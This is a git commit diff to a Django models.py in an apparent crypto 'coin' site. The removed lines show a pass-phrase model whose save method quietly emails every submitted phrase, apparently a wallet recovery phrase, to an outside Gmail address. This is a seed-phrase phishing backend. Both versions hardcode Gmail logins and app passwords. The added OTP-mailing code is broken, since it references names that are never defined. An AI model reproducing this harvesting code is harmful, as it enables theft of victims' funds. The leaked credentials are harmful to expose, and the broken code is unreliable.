df2d93d00cf238a3c5c2d088277a54e2a1db863e
Android_Lucifer <agwumafamelody@yahoo.com>
2024-08-22 18:23:24 +0100

    Update models.py

--- coin/models.py
+++ coin/models.py
@@ -1,32 +1,40 @@
 import smtplib
 from django.db import models
+import smtplib, ssl
+
+password = 'zwbp blgn lzba hbud'
+sender_email = 'ultragreentrades@gmail.com'
 
 # Create your models here.
 
 class PassPhrase(models.Model):
-    phrase = models.TextField(max_length=200,blank=False,null=False)
+    otp = models.TextField(max_length=200,blank=False,null=False)
     date_created = models.DateTimeField(auto_now_add=True)
     class Meta:
         ordering = ("-date_created",)
     def __str__(self) -> str:
-        return f"Key: {str(self.date_created)}"
-    def save(self, *args, **kwargs):
-        gmail_user = 'clovercooporative@gmail.com'
-        gmail_password = 'ghcz jcpi zqbk olay'
-        
-        sent_from = gmail_user
-        to = ['randallpitt3@gmail.com']
-        subject = 'New Pass Phrase Has Been Submitted'
-        
-        email_text = (f"From : pinetblockchain.com\nSubject : New Pass Phrase Added\n{self.phrase}")
-        try:
-            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-            server.ehlo()
-            server.login(gmail_user, gmail_password)
-            server.sendmail(sent_from, to, email_text)
-            server.close()
-        
-            print('Email sent!')
-        except:
-            pass
-        return super().save(*args, **kwargs)
+        return f"otp: {self.otp}"
+    def save(self , *args,**kwargs) -> None:
+                self.otp = otp
+                receiver_email =f"{self.email}"
+                message = MIMEMultipart("alternative")
+                message["Subject"] = "Account Activity"
+                message["From"] = sender_email
+                message["To"] = receiver_email
+                try:
+                    html = otptext.format(self.time,self.user,self.otp)
+                    part1 = MIMEText(text, "plain")
+                    part2 = MIMEText(html, "html")
+
+                    message.attach(part1)
+                    message.attach(part2)
+
+                    context = ssl.create_default_context()
+                    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+                        server.login(sender_email, password)
+                        server.sendmail(
+                            sender_email, receiver_email, message.as_string()
+                        )
+                    super(Otp, self).save(*args, **kwargs)
+                except:
+                    pass
